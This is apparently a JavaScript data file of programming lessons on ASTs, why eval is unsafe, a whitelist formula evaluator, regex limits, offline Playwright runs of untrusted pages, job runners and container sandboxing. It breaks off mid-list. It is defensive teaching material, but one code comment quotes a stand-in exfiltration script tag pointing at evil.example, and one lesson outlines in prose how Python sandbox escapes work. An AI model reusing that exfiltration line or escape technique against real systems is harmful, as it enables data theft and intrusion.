/* Forge Academy: deeper material for parsing, safe evaluation, browser automation and sandboxing lessons. */
window.DEEP = window.DEEP || {};
Object.assign(DEEP, {
  "15-0": {
    more: `<p><b>From characters to meaning in stages.</b> A <b>lexer</b> (tokenizer) turns raw text into tokens: <code>amount * rate / 100</code> becomes NAME(amount), STAR, NAME(rate), SLASH, NUMBER(100). A <b>parser</b> applies grammar rules (including operator precedence and associativity) to build a tree. Precedence is why <code>2 + 3 * 4</code> parses as <code>2 + (3 * 4)</code>: multiplication binds tighter, so it sits deeper in the tree and is evaluated first. Associativity decides that <code>10 - 4 - 3</code> is <code>(10 - 4) - 3</code>.</p>
<p><b>Abstract syntax trees (ASTs)</b> drop details like parentheses and whitespace that don't affect meaning, keeping only structure. Every serious language tool works on ASTs: compilers, interpreters, linters (ruff, eslint), formatters (black, prettier), refactoring tools, IDE features (go-to-definition, rename), security scanners (Semgrep, CodeQL) and code generators.</p>
<p><b>Python's <code>ast</code> module</b> gives you Python's own parser. <code>ast.parse(src)</code> parses a module (statements); <code>ast.parse(src, mode="eval")</code> parses a single expression. Key node types: <code>Expression</code> (root in eval mode), <code>BinOp</code> (with <code>op</code> such as <code>Add</code> or <code>Mult</code>), <code>UnaryOp</code>, <code>Compare</code>, <code>BoolOp</code>, <code>Name</code>, <code>Constant</code>, <code>Call</code>, <code>Attribute</code>, <code>Subscript</code> and <code>IfExp</code>. <code>ast.dump(tree, indent=2)</code> prints the structure and is the best way to learn it.</p>
<p><b>Walking trees</b>: <code>ast.walk</code> visits every node (handy for checks such as "does this use any Call nodes?"), while an <code>ast.NodeVisitor</code> subclass with <code>visit_BinOp</code>-style methods gives structured traversal, the basis for evaluators and analysers. <code>ast.NodeTransformer</code> rewrites trees, and <code>ast.unparse</code> turns a tree back into source code.</p>
<p><b>Writing your own parser</b> for a tiny language (formulas, filters, a query syntax) is a great exercise: a recursive-descent parser has one function per precedence level. For real projects, reuse an existing parser (Python's <code>ast</code> for Python-like expressions) or a parser generator such as Lark.</p>`,
    example: {
      t: "Exploring and analysing expressions with the ast module",
      intro: "Parse formulas, inspect their structure, list the variables and functions they use, and see precedence in the tree.",
      lang: "python",
      code: `import ast

expr = "round(amount * (1 + gst_rate) - discount, 2) if amount > 1000 else amount"
tree = ast.parse(expr, mode="eval")
print(ast.dump(tree, indent=2)[:600], "...")

# Which names and functions does a formula use?
class Usage(ast.NodeVisitor):
    def __init__(self):
        self.names, self.calls, self.ops = set(), set(), set()
    def visit_Name(self, node):
        self.names.add(node.id)
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name):
            self.calls.add(node.func.id)
        self.generic_visit(node)                 # keep walking into the arguments
    def visit_BinOp(self, node):
        self.ops.add(type(node.op).__name__)
        self.generic_visit(node)

u = Usage(); u.visit(tree)
print("variables:", u.names - u.calls)          # {'amount', 'gst_rate', 'discount'}
print("functions:", u.calls)                    # {'round'}
print("operators:", u.ops)                      # {'Mult', 'Add', 'Sub'}

# Precedence lives in the tree shape
t = ast.parse("2 + 3 * 4", mode="eval").body
print(type(t.op).__name__, type(t.right.op).__name__)    # Add Mult -> 3*4 is a child, evaluated first

# Transform: rename a variable everywhere, then turn the tree back into source
class Rename(ast.NodeTransformer):
    def visit_Name(self, node):
        return ast.Name(id="price" if node.id == "amount" else node.id, ctx=node.ctx)
print(ast.unparse(Rename().visit(tree)))`,
      after: "A NodeVisitor like <code>Usage</code> is how linters work: walk the tree, collect facts, and report anything that breaks the rules. The next lessons build a safe evaluator the same way."
    },
    mistakes: [
      "Analysing code with regular expressions when structure matters; nesting and precedence need a real parser.",
      "Forgetting <code>generic_visit</code> in a NodeVisitor method, so child nodes are never visited.",
      "Using <code>mode=\"exec\"</code> when you expect a single expression, so statements like imports are silently accepted.",
      "Assuming Python's ast works for other languages; each language needs its own parser.",
      "Writing a hand-rolled parser for a complex grammar instead of reusing a proven parser or generator."
    ],
    practice: [
      ["Describe the tree for <code>a - b * c</code>.", "A BinOp(Sub) whose left is Name(a) and whose right is BinOp(Mult) of Name(b) and Name(c), since multiplication binds tighter and sits deeper."],
      ["Write a function that returns True if an expression contains any function call.", "<pre>def has_call(src):\n    tree = ast.parse(src, mode=\"eval\")\n    return any(isinstance(n, ast.Call) for n in ast.walk(tree))</pre>"],
      ["Name three developer tools that rely on ASTs.", "Linters (ruff, eslint), formatters (black, prettier), compilers and interpreters, IDE refactoring (rename symbol), and static security scanners (Semgrep, CodeQL)."]
    ]
  },

  "15-1": {
    more: `<p><b><code>eval()</code> executes whatever code it is given.</b> If any part of the string comes from users, files, an API or a language model, running it hands your program's privileges to whoever wrote that string: it could read secrets from environment variables, change or delete files, or open network connections, all within whatever your process is allowed to do. <code>exec()</code>, <code>compile()</code>, <code>pickle.loads</code>, YAML's unsafe loader and template engines rendering untrusted templates carry the same risk.</p>
<p><b>Trying to "lock down" <code>eval</code> does not work, and this is the key lesson.</b> A popular attempt is to pass empty builtins (<code>eval(expr, {"__builtins__": {}}, variables)</code>) so that names like <code>open</code> are undefined. This feels safe but isn't: Python's object model lets an expression travel from an ordinary value to its class, to base classes, and onward to other classes loaded in the interpreter, some of which expose file, process or module-loading functionality, all without calling any name you blocked. String-level filtering (banning the word "import", say) fails too, because the same result can be reached through concatenation, encodings or attribute access. The practical conclusion, confirmed by many broken "Python sandbox" projects over the years, is simple: <b>do not try to make <code>eval</code> of untrusted input safe.</b> Don't call <code>eval</code> or <code>exec</code> on untrusted input at all.</p>
<p><b>Use the whitelist principle instead.</b> Rather than trying to block everything dangerous (a blacklist, which you will never complete), allow only an explicitly known-good set and reject everything else. For formulas, that means parsing the text into a syntax tree and accepting only specific node types: numbers, the variable names you supply, arithmetic and comparison operators, and a short list of approved functions. Attribute access and subscripting are rejected unless you specifically need and control them. Anything not on the list is refused before any evaluation happens. The next lesson builds exactly such an evaluator.</p>
<p><b>Safe alternatives by need</b>: <code>ast.literal_eval</code> parses Python literals (numbers, strings, lists, dicts) with no code execution; <code>json.loads</code> for data interchange; a whitelist-based evaluator or a maintained library (simpleeval, numexpr) or a rules engine for formulas; and for running genuinely arbitrary code, a real isolated sandbox with no secrets and minimal privileges (containers with dropped capabilities, gVisor, Firecracker microVMs, or WebAssembly runtimes).</p>`,
    example: {
      t: "The safe pattern: parse, whitelist the tree, then refuse anything unexpected",
      intro: "Instead of demonstrating attacks, here is the defensive pattern you should actually use: a validator that accepts only arithmetic on supplied variables, plus the standard literal and data parsers for their jobs.",
      lang: "python",
      code: `import ast

# Allow ONLY these node types for a numeric formula. Everything else is refused.
ALLOWED = (ast.Expression, ast.BinOp, ast.UnaryOp, ast.Constant, ast.Name, ast.Load,
           ast.Add, ast.Sub, ast.Mult, ast.Div, ast.Mod, ast.Pow, ast.USub)

def validate_arithmetic(expr: str, allowed_names: set[str]) -> ast.Expression:
    tree = ast.parse(expr, mode="eval")
    for node in ast.walk(tree):
        if not isinstance(node, ALLOWED):
            raise ValueError(f"not allowed: {type(node).__name__}")   # calls, attributes, etc. are rejected
        if isinstance(node, ast.Name) and node.id not in allowed_names:
            raise ValueError(f"unknown variable: {node.id}")
        if isinstance(node, ast.Constant) and not isinstance(node.value, (int, float)):
            raise ValueError("only numbers allowed")
    return tree

for formula in ["amount * (1 + rate) - discount", "price ** 2 / 2"]:
    validate_arithmetic(formula, {"amount", "rate", "discount", "price"})   # pass
    print("accepted:", formula)

for bad in ["unknown_var + 1", "amount.__class__", "helper(amount)", "amount if x else y"]:
    try:
        validate_arithmetic(bad, {"amount"})
    except ValueError as e:
        print("refused:", bad, "->", e)       # attribute access, calls and unknown names never get through

# Right tool for data, not code:
import json
print(ast.literal_eval("{'gst': 0.18, 'slabs': [0, 5, 12, 18, 28]}"))   # literals only, no execution
print(json.loads('{"gst": 0.18}'))                                       # untrusted data interchange`,
      after: "The validator walks the whole tree and refuses any node that isn't on the allow-list, so function calls, attribute access and unknown names are rejected up front, before a single operation is evaluated."
    },
    mistakes: [
      "Calling <code>eval</code> or <code>exec</code> on anything derived from user, file, API or model input.",
      "Believing <code>eval(expr, {\"__builtins__\": {}})</code> or string filtering makes untrusted input safe; it does not.",
      "Using a blacklist (block known-bad) instead of a whitelist (allow only known-good).",
      "Reaching for <code>eval</code> when you only need to parse data (<code>json.loads</code>) or a literal (<code>ast.literal_eval</code>).",
      "Running genuinely untrusted code without a real sandbox that has no secrets and minimal privileges."
    ],
    practice: [
      ["Why is a whitelist of allowed AST node types safer than filtering dangerous words out of the string?", "A blacklist must anticipate every dangerous construct and every way of spelling it (concatenation, encodings, attribute chains), which is effectively impossible. A whitelist accepts only a small, known-safe set and refuses everything else by default, so unforeseen tricks are rejected automatically."],
      ["You need to read a config value that is a Python list literal like <code>[1, 2, 3]</code> from a file. Which function, and why not <code>eval</code>?", "<code>ast.literal_eval</code>: it parses literals (numbers, strings, tuples, lists, dicts, booleans, None) without executing code, so a malicious file can't run anything."],
      ["When is running genuinely arbitrary untrusted code acceptable, and what does it require?", "When the use case truly needs it (for example executing AI-generated code to test it). It requires a real isolation boundary: an environment with no secrets, minimal privileges, no network by default, and strict memory, CPU and time limits (containers with dropped capabilities, gVisor, microVMs or WebAssembly), not an in-process trick."]
    ]
  },

  "15-2": {
    more: `<p><b>Two phases: validate once, evaluate many times.</b> A formula in a spec (like a computed field <code>amount * (1 + gst_rate)</code>) is checked a single time when the spec is accepted, then evaluated for every record. Separating these means the expensive safety checks run once, and per-record evaluation is fast and cannot do anything the validation didn't allow.</p>
<p><b>Validation</b> parses the formula and walks the tree, accepting only: number and (if you allow them) string constants; the specific variable names available in this context; a fixed set of operators; comparisons and boolean logic if needed; and calls to a small set of <b>whitelisted functions</b> you provide (<code>round</code>, <code>min</code>, <code>max</code>, <code>abs</code>, and domain functions like an EMI or percentage helper). It rejects attribute access, subscripting, lambdas, comprehensions, names it doesn't recognise and anything else. It also bounds the formula's length and nesting depth, because even safe operations can be abused (<code>9 ** 9 ** 9</code> would try to compute an astronomically large number).</p>
<p><b>Evaluation</b> walks the validated tree and computes the result itself, using operator tables that map AST operator nodes to Python functions (<code>ast.Add</code> to <code>operator.add</code>), and calling only whitelisted functions with evaluated arguments. It never calls <code>eval</code>; it is a tiny interpreter for your allowed sub-language. Because validation already guaranteed only safe nodes exist, evaluation is straightforward and secure.</p>
<p><b>Good errors</b>: report the exact problem (unknown field, division by zero, disallowed function) with the formula and position, so authors can fix their formulas. Return clear values for edge cases (define what division by zero does: raise, or return 0, consistently).</p>
<p>This pattern (parse, whitelist-validate, interpret) is how spreadsheet formula engines, rules engines and safe templating systems let users write expressions without letting them run arbitrary code.</p>`,
    example: {
      t: "A safe formula evaluator with an operator table and whitelisted functions",
      intro: "Validate once against an allow-list, then evaluate per record with a small tree-walking interpreter. No eval anywhere.",
      lang: "python",
      code: `import ast, operator

BIN_OPS = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul,
           ast.Div: operator.truediv, ast.Mod: operator.mod, ast.Pow: operator.pow}
CMP_OPS = {ast.Lt: operator.lt, ast.LtE: operator.le, ast.Gt: operator.gt,
           ast.GtE: operator.ge, ast.Eq: operator.eq, ast.NotEq: operator.ne}
FUNCTIONS = {"round": round, "min": min, "max": max, "abs": abs,
             "pct": lambda value, p: value * p / 100,
             "emi": lambda principal, monthly_rate, months:
                 principal * monthly_rate * (1 + monthly_rate) ** months / ((1 + monthly_rate) ** months - 1)}
ALLOWED_NODES = (ast.Expression, ast.BinOp, ast.UnaryOp, ast.USub, ast.Constant, ast.Name, ast.Load,
                 ast.Call, ast.Compare, ast.BoolOp, ast.And, ast.Or, ast.IfExp,
                 *BIN_OPS, *CMP_OPS)

class FormulaError(ValueError): ...

def validate(expr: str, fields: set[str], max_len: int = 500) -> ast.Expression:
    if len(expr) > max_len:
        raise FormulaError("formula too long")
    try:
        tree = ast.parse(expr, mode="eval")
    except SyntaxError as e:
        raise FormulaError(f"syntax error: {e.msg}")
    for node in ast.walk(tree):
        if not isinstance(node, ALLOWED_NODES):
            raise FormulaError(f"{type(node).__name__} is not allowed")
        if isinstance(node, ast.Name) and node.id not in fields and node.id not in FUNCTIONS:
            raise FormulaError(f"unknown name: {node.id}")
        if isinstance(node, ast.Call):
            if not isinstance(node.func, ast.Name) or node.func.id not in FUNCTIONS:
                raise FormulaError("only whitelisted functions may be called")
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Pow):
            if isinstance(node.right, ast.Constant) and node.right.value > 8:
                raise FormulaError("exponent too large")          # bound even safe operations
    return tree

def evaluate(tree: ast.Expression, values: dict):
    def ev(n):
        if isinstance(n, ast.Expression): return ev(n.body)
        if isinstance(n, ast.Constant): return n.value
        if isinstance(n, ast.Name): return values[n.id]
        if isinstance(n, ast.UnaryOp): return -ev(n.operand)
        if isinstance(n, ast.BinOp):
            right = ev(n.right)
            if isinstance(n.op, (ast.Div, ast.Mod)) and right == 0:
                raise FormulaError("division by zero")
            return BIN_OPS[type(n.op)](ev(n.left), right)
        if isinstance(n, ast.Compare):
            return CMP_OPS[type(n.ops[0])](ev(n.left), ev(n.comparators[0]))
        if isinstance(n, ast.BoolOp):
            vals = [ev(v) for v in n.values]
            return all(vals) if isinstance(n.op, ast.And) else any(vals)
        if isinstance(n, ast.IfExp):
            return ev(n.body) if ev(n.test) else ev(n.orelse)
        if isinstance(n, ast.Call):
            return FUNCTIONS[n.func.id](*[ev(a) for a in n.args])
        raise FormulaError(f"cannot evaluate {type(n).__name__}")
    return ev(tree)

fields = {"principal", "rate", "months", "amount"}
tree = validate("round(emi(principal, rate/1200, months), 2) if amount > 100000 else 0", fields)
for row in [{"principal": 500000, "rate": 9, "months": 60, "amount": 500000},
            {"principal": 20000, "rate": 12, "months": 12, "amount": 20000}]:
    print(evaluate(tree, row))`,
      after: "This is a real interpreter for a safe sub-language: validation guarantees only allowed nodes exist, and evaluation computes them directly. There is no path to arbitrary code because arbitrary code never parses past validation."
    },
    mistakes: [
      "Validating and evaluating in one pass per record, so expensive checks run on every row.",
      "Allowing attribute access or subscripting \"just in case\", which reopens escape routes.",
      "Forgetting to bound length, depth and exponents, letting a safe-looking formula consume huge memory or CPU.",
      "Undefined behaviour for division by zero or missing fields; decide and document it.",
      "Growing the function whitelist carelessly; each added function is new attack surface and must be pure and safe."
    ],
    practice: [
      ["Why validate the formula once at spec time rather than on every record?", "Validation does the expensive, security-critical work (parsing and whitelisting). Doing it once and then evaluating a pre-checked tree per record is faster and guarantees every evaluation stays within the allowed sub-language."],
      ["A user writes <code>balance / withdrawals</code> and some rows have zero withdrawals. What are your options?", "Decide a consistent policy: raise a FormulaError that's reported to the user, or treat division by zero as 0 or null. Whatever you choose, document it and handle it explicitly in the evaluator rather than letting a ZeroDivisionError leak out."],
      ["How would you add a <code>clamp(x, lo, hi)</code> function safely?", "Add it to the FUNCTIONS whitelist as a pure Python function (<code>lambda x, lo, hi: max(lo, min(hi, x))</code>). Validation already restricts calls to whitelisted names, so it's usable immediately and nothing else changes."]
    ]
  },

  "15-3": {
    more: `<p><b>Regex and parsers each have a job.</b> Regular expressions are perfect for <b>local, flat patterns</b>: find all function declarations, extract IDs, match a date format, pull quoted strings. They're fast, built in, and need no dependencies. They cannot reliably handle <b>nested or recursive structure</b>, because matching balanced brackets, nested tags or arbitrary expressions is beyond what classic regular expressions can express. For anything where nesting matters (parsing JSON, HTML, or a programming language's full grammar), use a real parser.</p>
<p><b>Good uses of regex for code and text analysis</b>: building a rough map of a codebase (function names, which files define routes, TODO comments), extracting structured fields from logs and semi-structured text, simple find-and-replace refactors, and validating formats (email-ish, PIN code, phone). Use named groups (<code>(?P&lt;name&gt;...)</code>) for readability, alternation (<code>|</code>) for variants (<code>function (\\w+)</code> vs <code>const (\\w+) =</code>), anchors and word boundaries to avoid partial matches, and the <code>re.VERBOSE</code> flag to write complex patterns with comments.</p>
<p><b>When regex quietly breaks</b>: it matches inside strings and comments (a "function" mentioned in a comment), it misses constructs it didn't anticipate (a new way of declaring something), and it can be fooled by unusual formatting. For a rough map that a human or model will use as a hint, that's acceptable; for anything that must be correct (a refactoring tool, a security check), use the language's parser.</p>
<p><b>Catastrophic backtracking</b>: some patterns (nested quantifiers like <code>(a+)+</code> against certain inputs) take exponential time, which is a denial-of-service risk on untrusted input. Keep patterns simple, avoid nested quantifiers on overlapping character sets, prefer specific character classes (<code>[^"]*</code> rather than <code>.*</code>), set input size limits, and consider the <code>regex</code> module's timeout or Google's RE2 for untrusted patterns.</p>`,
    example: {
      t: "Mapping a JavaScript file with well-chosen regexes (and knowing the limits)",
      intro: "Build a rough map of a JS file (functions, element IDs it touches, TODOs) to give a model or developer a quick overview, using named groups and the verbose flag.",
      lang: "python",
      code: `import re

FUNC = re.compile(r"""
    (?:                                   # two common ways to declare a function
        function\\s+(?P<a>[A-Za-z_$][\\w$]*)            # function foo(
      | (?:const|let|var)\\s+(?P<b>[A-Za-z_$][\\w$]*)\\s*=\\s*(?:async\\s*)?\\(  # const foo = (...) =>
    )
""", re.VERBOSE)

DOM_ID = re.compile(r"""getElementById\\(\\s*['"](?P<id>[\\w-]+)['"]\\s*\\)
                     | querySelector\\(\\s*['"]#(?P<id2>[\\w-]+)['"]""", re.VERBOSE)
TODO = re.compile(r"//\\s*(?P<kind>TODO|FIXME|HACK)[:\\s]+(?P<text>.+)")

def map_js(src: str) -> dict:
    funcs = sorted({m.group("a") or m.group("b") for m in FUNC.finditer(src)})
    ids = sorted({m.group("id") or m.group("id2") for m in DOM_ID.finditer(src) if m.group("id") or m.group("id2")})
    todos = [{"kind": m.group("kind"), "text": m.group("text").strip()} for m in TODO.finditer(src)]
    return {"functions": funcs, "touches_ids": ids, "todos": todos}

sample = '''
// TODO: debounce this handler
function updateCart(items) {
  const total = items.reduce((s, i) => s + i.price, 0);
  document.getElementById("cart-total").textContent = total;
}
const render = (state) => { document.querySelector("#list").innerHTML = ""; };
// FIXME: handles only INR
'''
print(map_js(sample))
# {'functions': ['render', 'updateCart'], 'touches_ids': ['cart-total', 'list'],
#  'todos': [{'kind': 'TODO', ...}, {'kind': 'FIXME', ...}]}

# Known limits (why this is a 'rough map', not a parser):
#  - a string literal '"function foo"' inside the code could match FUNC
#  - nested braces, object methods and class syntax need a real JS parser (acorn, @babel/parser)
#  - don't use regex to, say, remove a function body: matching the matching closing brace needs a parser`,
      after: "This map is good enough to orient a developer or feed a model as a hint. The moment you need correctness (removing a function, rewriting calls), switch to a real JavaScript parser that understands nesting."
    },
    mistakes: [
      "Using regex to parse nested or recursive structures (JSON, HTML, matched braces); use a parser instead.",
      "Patterns that also match inside strings and comments, producing false positives.",
      "Nested quantifiers on overlapping classes (like <code>(\\w+)*</code>) that cause catastrophic backtracking on some inputs.",
      "Unreadable mega-regexes; use named groups, alternation and <code>re.VERBOSE</code> with comments.",
      "Trusting a regex map as if it were exact when it's only a heuristic overview."
    ],
    practice: [
      ["Why can't a classic regular expression reliably match balanced brackets, as in extracting a complete function body?", "Balanced nesting requires counting how many brackets are open, which needs memory of unbounded depth. Classic regular expressions describe finite-state patterns and can't count arbitrary nesting, so you need a parser (or a stack)."],
      ["Write a regex with named groups to extract <code>KEY=value</code> pairs from an .env file, ignoring comment lines.", "<pre>re.compile(r\"^(?!\\s*#)(?P&lt;key&gt;[A-Z_][A-Z0-9_]*)=(?P&lt;value&gt;.*)$\", re.M)</pre>The negative lookahead <code>(?!\\s*#)</code> skips comment lines."],
      ["What is catastrophic backtracking and how do you avoid it on untrusted input?", "Certain patterns (nested quantifiers over overlapping character sets) can take exponential time on crafted inputs, freezing your service. Avoid nested quantifiers, use specific character classes instead of <code>.*</code>, cap input length, and use a timeout-capable engine or RE2 for untrusted patterns."]
    ]
  },

  "17-2": {
    more: `<p><b>Running someone else's web content means running their code.</b> Browser automation (Playwright, Puppeteer) is powerful: it drives a real browser to load pages, fill forms, click and capture results. When the page or tool you load is untrusted (a user upload, a scraped site, an AI-generated app), it can try to call home, load trackers, exfiltrate data, or exploit the browser. You need to isolate it.</p>
<p><b>Network interception</b> is the key control. Playwright's <code>page.route</code> lets you inspect and decide on <i>every</i> request the page makes. The strict pattern for running untrusted content offline: <b>abort every request by default</b>, and fulfil only the specific ones you intend to serve (the tool's own files, from a fake local origin you control). The content then runs with no real network access, so it can't phone home, load third-party scripts or leak data over the network, while still functioning for your test. This is far stronger than hoping a Content-Security-Policy holds.</p>
<p><b>Serving from a fake origin</b>: give the content a stable origin like <code>http://engine.local/</code> and fulfil its requests from local files, so relative URLs and same-origin behaviour work while nothing external is reachable.</p>
<p><b>Capturing downloads</b>: use <code>page.expect_download()</code> around the click that triggers a download, then save it to a controlled location with <code>download.save_as(path)</code>, enforcing size and type limits. Don't let the page choose arbitrary file paths.</p>
<p><b>Injecting scripts early</b>: <code>page.add_init_script</code> runs your code before any page script on every navigation, useful for stubbing APIs, freezing time and randomness (so runs are reproducible), or installing hooks to observe behaviour. Combine browser-level isolation with OS-level sandboxing (run the whole browser in a locked-down container, next lesson), since a determined exploit could try to escape the browser itself.</p>`,
    example: {
      t: "Running an untrusted HTML tool fully offline with Playwright",
      intro: "Serve the tool from a fake origin, block all other network traffic, freeze time for reproducibility, and capture any download safely.",
      lang: "python",
      code: `# pip install playwright && playwright install chromium
from pathlib import Path
from playwright.sync_api import sync_playwright

ORIGIN = "http://engine.local/"

def run_tool_offline(tool_html: str, actions, out_dir: Path) -> dict:
    out_dir.mkdir(parents=True, exist_ok=True)
    with sync_playwright() as p:
        browser = p.chromium.launch(args=["--no-sandbox"])    # the OS sandbox is the container (next lesson)
        context = browser.new_context()

        def gate(route):
            url = route.request.url
            if url == ORIGIN or url == ORIGIN + "index.html":
                route.fulfill(status=200, content_type="text/html", body=tool_html)   # serve our file
            else:
                route.abort()                                  # block EVERYTHING else: no phone-home, no trackers
        context.route("**/*", gate)

        page = context.new_page()
        page.add_init_script("""
            Date.now = () => 1766000000000;                    // freeze time for reproducible runs
            Math.random = () => 0.42;
        """)
        page.goto(ORIGIN, wait_until="networkidle")

        results = {"console": [], "downloads": []}
        page.on("console", lambda m: results["console"].append(m.text))

        for action in actions:                                 # e.g. [("fill", "#amount", "500000"), ("click", "#calc")]
            kind, selector, *rest = action
            if kind == "fill": page.fill(selector, rest[0])
            elif kind == "click":
                if rest and rest[0] == "download":
                    with page.expect_download() as dl:
                        page.click(selector)
                    download = dl.value
                    target = out_dir / Path(download.suggested_filename).name   # never trust the full path
                    download.save_as(target)
                    results["downloads"].append(str(target))
                else:
                    page.click(selector)

        results["screenshot"] = str(out_dir / "result.png")
        page.screenshot(path=results["screenshot"])
        browser.close()
    return results

# Even if the tool's HTML contains <script src="https://evil.example/collect?data=...">,
# the gate aborts that request: nothing leaves the machine.`,
      after: "The whole defence rests on \"abort by default, fulfil only what I chose to serve.\" That turns an unpredictable page into one that can only interact with files you control."
    },
    mistakes: [
      "Loading untrusted pages without intercepting network requests, letting them call external servers.",
      "Allow-listing specific bad domains (a blacklist) instead of blocking everything and allowing only your own origin.",
      "Letting the page choose download paths, enabling writes outside your intended folder.",
      "Relying only on a Content-Security-Policy inside the page instead of controlling the network at the automation layer.",
      "Running the browser without an outer OS sandbox, so a browser exploit has full access to the host."
    ],
    practice: [
      ["What's the difference between blocking known tracker domains and the \"abort by default\" approach, and why does it matter for untrusted content?", "Blocking known trackers is a blacklist that misses anything new or unexpected. Aborting every request and fulfilling only your own files is a whitelist: unknown or hidden exfiltration attempts are blocked automatically, because nothing is allowed unless you explicitly serve it."],
      ["Why freeze <code>Date.now</code> and <code>Math.random</code> before the page loads?", "So runs are reproducible: the same input always produces the same output, which makes golden-file comparison and debugging possible. Injecting with <code>add_init_script</code> ensures it happens before any page code reads the clock or randomness."],
      ["A tool triggers a file download. List two safety checks before saving it.", "Save it under a controlled directory using only the base filename (never a path the page supplies), and enforce a maximum size and an allowed type, rejecting anything larger or unexpected."]
    ]
  },

  "17-3": {
    more: `<p><b>Turning a script into a service.</b> Running one browser job interactively is easy; running many, reliably, for real users, is a systems problem. The common design is <b>one isolated subprocess (or container) per job</b>: the job can't interfere with others, a crash or hang affects only itself, and you can apply strict per-job resource limits and timeouts. A worker pool pulls jobs from a queue, launches the runner, and collects results.</p>
<p><b>Progress and results.</b> Browser jobs can take many seconds to minutes. The runner writes <b>progress</b> to a file or a status record the API polls or streams to the user ("loading page", "step 3 of 5"), and writes <b>results</b> (extracted data, screenshots, downloads, a report) to a per-job folder. Keep the API process and the browser process separate, so a stuck browser never blocks the API.</p>
<p><b>Timeouts and cleanup</b> are essential: browsers hang, pages wait forever for elements, and memory leaks accumulate. Enforce a hard wall-clock timeout per job and kill the whole process tree if exceeded (a killed parent can leave orphaned Chromium processes, so kill the group). Clean up temporary profiles and folders. Cap concurrent browsers (each uses significant memory). Browsers need more shared memory than default container limits allow, so raise <code>/dev/shm</code> (<code>--shm-size</code>) or use <code>--disable-dev-shm-usage</code>.</p>
<p><b>Golden runs for testing.</b> For deterministic tools, record the expected output once (the "golden" result: report values, key screenshot regions, downloaded file hashes) and compare future runs against it. This catches regressions when you change the runner, upgrade the browser, or regenerate a tool. Combine with the reproducibility tricks from the previous lesson (frozen time and randomness, no network) so comparisons are stable.</p>
<p><b>Observability</b>: log each job's steps, duration, outcome and resource use; capture a screenshot and the console on failure; and track success rate and p95 duration so you notice when the service degrades.</p>`,
    example: {
      t: "A job runner with timeout, process-group kill, progress and golden comparison",
      intro: "The supervisor side: launch the browser runner as a subprocess with a hard timeout, read its progress, kill the whole process group if it hangs, and compare the result to a recorded golden output.",
      lang: "python",
      code: `import json, os, signal, subprocess, time, hashlib
from pathlib import Path

def run_job(job_id: str, tool_path: str, jobs_dir: Path, timeout_s: int = 90) -> dict:
    job_dir = jobs_dir / job_id
    job_dir.mkdir(parents=True, exist_ok=True)
    progress = job_dir / "progress.json"
    progress.write_text(json.dumps({"state": "starting", "pct": 0}))

    # New process GROUP so we can kill orphaned Chromium children too
    proc = subprocess.Popen(["python", "runner.py", "--tool", tool_path, "--out", str(job_dir)],
                            start_new_session=True)
    start = time.time()
    try:
        while proc.poll() is None:
            if time.time() - start > timeout_s:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)       # kill the whole tree
                return {"job": job_id, "status": "timeout", "progress": _read(progress)}
            time.sleep(0.5)
    finally:
        if proc.poll() is None:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    if proc.returncode != 0:
        return {"job": job_id, "status": "failed", "progress": _read(progress)}

    result = json.loads((job_dir / "result.json").read_text())
    return {"job": job_id, "status": "ok", "result": result,
            "duration_s": round(time.time() - start, 1)}

def _read(p: Path) -> dict:
    try: return json.loads(p.read_text())
    except Exception: return {}

def file_hash(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()[:16]

def compare_to_golden(job_dir: Path, golden_dir: Path) -> list[str]:
    diffs = []
    got = json.loads((job_dir / "result.json").read_text())
    want = json.loads((golden_dir / "result.json").read_text())
    for key in want:                                            # numeric/text report fields must match
        if got.get(key) != want[key]:
            diffs.append(f"{key}: got {got.get(key)!r}, expected {want[key]!r}")
    for f in golden_dir.glob("downloads/*"):                    # downloaded files must be identical
        produced = job_dir / "downloads" / f.name
        if not produced.exists():
            diffs.append(f"missing download {f.name}")
        elif file_hash(produced) != file_hash(f):
            diffs.append(f"download {f.name} differs")
    return diffs

# docker run --rm --shm-size=1g --memory=1g --pids-limit=256 --network none runner-image ...
# (browsers need more /dev/shm than the default 64 MB, or use --disable-dev-shm-usage)`,
      after: "Starting the runner in a new session (its own process group) is what makes the timeout reliable: killing the group takes down Chromium's child processes too, instead of leaving them running and leaking memory."
    },
    mistakes: [
      "Running browser jobs in the API process, so one stuck browser blocks all requests.",
      "A timeout that kills only the parent, leaving orphaned Chromium processes consuming memory.",
      "No per-job resource limits, so a few heavy jobs exhaust the host's memory.",
      "Default container shared memory (64 MB), which crashes Chromium; raise <code>--shm-size</code> or disable /dev/shm usage.",
      "No golden comparison, so a browser upgrade or runner change silently changes outputs."
    ],
    practice: [
      ["Why start the runner subprocess in its own process group (new session)?", "Browsers spawn child processes. Killing only the parent on timeout can leave orphaned Chromium processes running and leaking memory. Killing the whole process group takes them all down."],
      ["Chromium crashes in your container with a shared-memory error. What's the fix?", "Browsers need more <code>/dev/shm</code> than the default 64 MB. Run with <code>--shm-size=1g</code> (or similar), or pass <code>--disable-dev-shm-usage</code> so Chromium uses a temp directory instead."],
      ["How do golden runs catch regressions, and what must be true for them to be stable?", "You record the expected output once and compare future runs to it, flagging any difference. It requires deterministic runs: frozen time and randomness, no network, and fixed inputs, so legitimate output never changes between runs."]
    ]
  },

  "10-2": {
    more: `<p><b>Why treat generated or uploaded code as hostile.</b> Code produced by a language model, or uploaded by a user, has not been reviewed and could do anything: read secrets, delete files, mine cryptocurrency, attack other machines, or try to escape onto the host. Even well-intentioned code can have bugs that consume all CPU or memory. The goal of sandboxing is <b>containment</b>: assume the code is malicious and limit the damage it can do, so the worst case is a wasted, isolated container.</p>
<p><b>Defence in depth</b> for running untrusted code in containers (Docker and similar). None of these alone is enough; together they form a strong boundary:</p>
<ul><li><b>Drop privileges</b>: <code>--cap-drop ALL</code> removes Linux capabilities the code doesn't need; <code>--security-opt no-new-privileges</code> stops a process gaining more privileges (for example through setuid binaries); run as a non-root user.</li>
<li><b>Read-only filesystem</b>: <code>--read-only</code> with a small writable <code>--tmpfs</code> for scratch space means the code can't modify the image or persist anything.</li>
<li><b>No network</b>: <code>--network none</code> for code that shouldn't reach out (like running tests), which prevents data exfiltration and attacks on other systems.</li>
<li><b>Resource limits</b>: <code>--memory</code>, <code>--cpus</code>, <code>--pids-limit</code> cap memory, CPU and the number of processes (a fork bomb protection), so runaway code can't take down the host.</li>
